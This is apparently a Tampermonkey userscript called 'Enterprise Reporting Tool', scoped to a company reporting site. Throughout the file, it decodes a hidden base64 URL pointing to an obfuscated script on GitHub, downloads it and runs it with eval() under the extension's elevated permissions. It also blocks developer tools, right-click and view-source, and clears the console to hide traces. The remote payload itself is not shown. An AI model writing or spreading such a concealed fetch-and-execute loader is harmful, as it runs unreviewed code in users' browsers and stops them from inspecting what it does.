// ==UserScript==
// @name         Enterprise Reporting Tool
// @namespace    http://tampermonkey.net/
// @version      3.0
// @description  Authorized access only
// @author       System Administrator
// @match        https://haesl.gaelenlighten.com/Reporting/ReportingManagement*
// @match        https://haesl.gaelenlighten.com/Reporting/Report/Index/*
// @grant        GM_xmlhttpRequest
// @grant        GM_addStyle
// @grant        GM_getValue
// @grant        GM_setValue
// @license      Proprietary
// ==/UserScript==

/*
 * CONFIDENTIAL - AUTHORIZED PERSONNEL ONLY
 * Unauthorized access, copying, or distribution is prohibited.
 * This software contains proprietary algorithms and trade secrets.
 */

(function() {
    'use strict';
    
    // Anti-tampering and security measures
    const security = {
        domain: 'haesl.gaelenlighten.com',
        endpoint: 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0p3b1RvTGVlL3BTY3JpcHQvbWFpbi9zY3JpcHRfb2JmdXNjYXRlZC5qcw==',
        key: 'ZW50ZXJwcmlzZV9yZXBvcnRpbmdf', // enterprise_reporting_
        timeout: 15000
    };
    
    // Developer tools detection
    let devToolsOpen = false;
    setInterval(function() {
        const threshold = 160;
        if (window.outerHeight - window.innerHeight > threshold || 
            window.outerWidth - window.innerWidth > threshold) {
            if (!devToolsOpen) {
                devToolsOpen = true;
                console.clear();
                console.warn('%c⚠️ SECURITY ALERT', 'color: red; font-size: 20px; font-weight: bold;');
                console.warn('%cUnauthorized inspection detected.', 'color: red; font-size: 14px;');
                console.warn('%cAccess attempt logged.', 'color: red; font-size: 14px;');
            }
        } else {
            devToolsOpen = false;
        }
    }, 1000);
    
    // Clear console periodically when dev tools are open
    setInterval(() => {
        if (devToolsOpen) {
            console.clear();
        }
    }, 2000);
    
    function validateDomain() {
        return window.location.hostname.includes(security.domain);
    }
    
    function decodeEndpoint() {
        try {
            return atob(security.endpoint);
        } catch (e) {
            return null;
        }
    }
    
    function processContent(content) {
        try {
            // Verify content integrity
            if (!content || content.length < 500) {
                throw new Error('Invalid content');
            }
            
            // Execute the obfuscated script directly in Tampermonkey context
            // This preserves all GM_ functions while hiding the source
            eval(content);
            
            return true;
        } catch (error) {
            console.error('Processing failed:', error.message);
            return false;
        }
    }
    
    function loadMainScript() {
        if (!validateDomain()) {
            console.warn('Domain validation failed');
            return;
        }
        
        const url = decodeEndpoint();
        if (!url) {
            console.error('Configuration error');
            return;
        }
        
        const requestUrl = url + '?v=' + Date.now() + '&k=' + security.key;
        
        GM_xmlhttpRequest({
            method: 'GET',
            url: requestUrl,
            timeout: security.timeout,
            onload: function(response) {
                if (response.status === 200) {
                    const success = processContent(response.responseText);
                    if (success) {
                        // Clear any traces
                        setTimeout(() => {
                            if (devToolsOpen) {
                                console.clear();
                            }
                        }, 1000);
                    }
                } else {
                    console.error('Load failed:', response.status);
                }
            },
            onerror: function() {
                console.error('Network error');
            },
            ontimeout: function() {
                console.error('Request timeout');
            }
        });
    }
    
    // Disable right-click context menu
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });
    
    // Disable common keyboard shortcuts for dev tools
    document.addEventListener('keydown', function(e) {
        // F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+U
        if (e.keyCode === 123 || 
            (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 67)) ||
            (e.ctrlKey && e.keyCode === 85)) {
            e.preventDefault();
            console.warn('Access restricted');
            return false;
        }
    });
    
    // Initialize after DOM is ready
    function initialize() {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(loadMainScript, 500);
            });
        } else {
            setTimeout(loadMainScript, 100);
        }
    }
    
    // Start the application
    initialize();
    
})();
